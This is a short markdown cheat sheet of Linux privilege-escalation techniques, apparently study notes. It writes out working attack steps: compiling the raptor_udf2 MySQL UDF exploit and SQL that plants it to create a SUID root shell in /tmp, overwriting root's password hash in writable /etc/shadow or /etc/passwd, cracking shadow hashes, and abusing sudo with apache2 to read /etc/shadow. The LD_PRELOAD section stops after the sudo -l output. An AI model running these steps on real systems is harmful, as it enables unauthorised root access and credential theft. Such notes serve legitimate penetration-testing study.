# Linux priv esculation

## MySQL exploit

This exploit works if MySQL is run in root mode.

Using this exploit (https://www.exploit-db.com/exploits/1518)

Complie the code using gcc:

~~~ 
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
~~~

Open MySQL and create a user defined function that runs system commands.

This creates a SUID in the tmp that when run esculates priviledge. 

~~~
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
~~~
 
## Readable /etc/shadow

Readable /etc/shadowcan copied and cracked by john

## Writeable /etc/shadow

Generate a new password and replace the root password

~~~
mkpasswd -m sha-512 <password here>

Put :7::: at the end
~~~

## Writable /etc/passwd file

Generate a new password hash:

~~~
openssl passwd <newpassword>
~~~

Then in the /etc/passwd file change root password hash (it will be an x).


## Sudo escape sequencies.

~~~
sudo -l 
~~~

Then use GTFOBins (https://gtfobins.github.io) to look for sudo privesc.

If apache2 can be used in sudo then run:

~~~
sudo apache2 -f /etc/shadow
~~~

This gives the password sha-512 for root.

## sudo enviornmental variables.

Sudo can be configured to inherit environment variables from the user's environment.

~~~
sudo -l
--------------------------------------------------------------
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
--------------------------------------------------------------
~~~



